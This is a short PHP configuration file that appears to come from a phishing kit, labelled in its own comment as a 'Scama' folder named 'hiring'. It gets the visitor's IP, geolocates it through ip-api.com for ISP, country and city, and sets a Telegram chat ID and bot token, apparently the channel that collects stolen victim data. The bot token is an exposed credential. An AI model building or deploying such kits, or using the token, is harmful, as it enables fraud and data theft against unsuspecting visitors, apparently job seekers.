<?php
// Function to get the visitor's IP address
function getVisitorIP() {
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Get the visitor's IP address
$ip = getVisitorIP();

// Construct the API URL
$api_url = "http://ip-api.com/json/{$ip}";

// Send a GET request to the API
$response = file_get_contents($api_url);

// Decode the JSON response
$data = json_decode($response);

// Extract relevant information
$isp = $data->isp;
$country = $data->country;
$city = $data->city;

// You can now use these parameters as needed in your application.
// For example, you can pass them to a function, store them in a database, or use them in any other way.

// Your Scama folder name
$folder = 'hiring';


$timer = "45";
$randomId = uniqid();  // Generate a unique random ID
#Generate Random Numbers
$str=rand();
$randString = md5($str);
// Your Telegram Chat ID

$vuesChatId = "-4552726149";
$chatId = "-4552726149"; 
$botToken = "7336006335:AAH-Tc4THAuDSAUPy47XVsDiHFBx06qSwTQ"; 

?>